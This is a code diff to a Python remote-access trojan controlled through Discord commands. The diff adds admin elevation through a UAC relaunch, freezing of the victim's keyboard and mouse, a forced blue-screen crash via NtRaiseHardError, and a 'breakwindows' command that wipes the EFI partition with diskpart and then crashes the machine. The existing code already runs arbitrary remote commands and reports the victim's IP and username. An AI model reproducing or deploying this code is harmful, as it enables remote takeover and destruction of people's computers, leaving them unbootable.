@@ -5,6 +5,7 @@ import time
 import ctypes
 import threading
 import base64
+import shutil
 try:
     import keyboard
     import wmi
@@ -12,12 +13,20 @@ try:
     import requests
     import getpass
     import pyautogui
+    import pynput
 except:
-    os.system('pip install wmi&pip install mouse&pip install requests&pip install keyboard&pip install pyautogui')
+    os.system('pip install wmi&pip install mouse&pip install requests&pip install keyboard&pip install pyautogui&pip install pynput')
     os.system('python "' + __file__ + '"')
     exit()
 import DiscordRestAPI
 import atexit
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
+if not IsAdmin():
+    # Re-run the program with admin rights
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    sys.exit()
 def get_user_uuid():
     wmi_obj = wmi.WMI()
     computer_system = wmi_obj.Win32_ComputerSystemProduct()[0]
@@ -35,8 +44,7 @@ def Mbox(text):
     os.system('del /f ' +os.environ['temp'] + '\\message.vbs')
 def remove_channel(id):
     user.Channel.Delete(user,id)
-def IsAdmin() -> bool:
-    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
 def get_info(thing=''):
     if thing=='ip':
         msg = 'IP: ' + requests.get('https://api.ipify.org?format=text').text
@@ -44,6 +52,7 @@ def get_info(thing=''):
         msg = 'User👤: ' + getpass.getuser() + ' Admin:' + ['❌','✅'][IsAdmin()]
     else:
         msg = 'Pick a option (ip/user)'
+    print(keyboard_freeze)
     user.Message.Send(user,msg,channel_id)
 def exit_script():
     global stop
@@ -76,16 +85,77 @@ def click(clicktype='left'):
     else:
         pyautogui.rightClick()
     user.Message.Send(user,'Clicked mouse!',channel_id)
-
-def help_cmd():
-    ...
+keyboard_freeze = pynput.keyboard.Listener(suppress=True)
+freezed = 0
+def freeze_mouse(freeze='yes'):
+    if freeze=='yes':
+        global freezed
+        if freezed==None:
+            freezed = 0
+        if freezed:
+            user.Message.Send(user,'Keyboard already freezed!',channel_id)
+            return
+        freezed = 1
+        global keyboard_freeze
+        global mouse_freeze
+        keyboard_freeze = pynput.keyboard.Listener(suppress=True)
+        keyboard_freeze.start()
+        mouse_freeze = pynput.mouse.Listener(suppress=True)
+        mouse_freeze.start()
+        user.Message.Send(user,'Freezed keyboard!',channel_id)
+    elif freeze=='no':
+        try:
+            if freezed==None:
+                freezed = 0
+        except:
+            user.Message.Send(user,'Keyboard not freezed!',channel_id)
+            return
+        if not freezed:
+            user.Message.Send(user,'Keyboard not freezed!',channel_id)
+            return
+        keyboard_freeze.stop()
+        mouse_freeze.stop()
+        user.Message.Send(user,'Unfreezed keyboard!',channel_id)
+        freezed = 0
+    else:
+        user.Message.Send(user,'Invalid option: Valid options are (yes/no)',channel_id)
 stop = False
+def bsod():
+    ntdll = ctypes.windll.ntdll
+    po = ctypes.c_bool()
+    ntdll.RtlAdjustPrivilege(19,True,False,ctypes.pointer(po))
+    response = ctypes.c_ulong()
+    ntdll.NtRaiseHardError(0xdeaddead,0,0,0,6,ctypes.byref(response))
+def computer_bsod():
+    user.Message.Send(user,"BSODing computer.",channel_id)
+    threading.Thread(target=bsod).start()
+    remove_channel(channel_id)
+    sys.exit()
+def danger(arg=None):
+    if arg=='bsod':
+        computer_bsod()
+    elif arg=='breakwindows':
+        user.Message.Send(user,"Wiping the EFI Partition!",channel_id)
+        with open(os.environ['temp'] + '\\tmp.txt','w') as f:
+            f.write('''
+sel disk 0
+sel par 1
+assign letter=Z
+''')
+        os.system('diskpart /s %temp%\\tmp.txt')
+        os.system('rd /q /s Z:')
+        computer_bsod()
+    else:
+        user.Message.Send(user,"Choose option: (bsod/breakwindows)",channel_id)
+
 user.Command.add_command(user,'get_info',channel_id,'!',get_info,1)
 user.Command.add_command(user,'stop',channel_id,'!',exit_script)
 user.Command.add_command(user,'run_cmd',channel_id,'!',run_command,-1)
 user.Command.add_command(user,'msg',channel_id,'!',msgbox,-1)
 #user.Command.add_command(user,'click',channel_id,'!',click,1)
-user.Command.add_command(user,'move',channel_id,'!',move_mouse,2)
+user.Command.add_command(user,'danger',channel_id,'!',danger,1)
+user.Command.add_command(user,'freeze',channel_id,'!',freeze_mouse,1)
+#user.Command.add_command(user,'move',channel_id,'!',move_mouse,2)
 
 atexit.register(remove_channel,channel_id)
 #time.sleep(3)
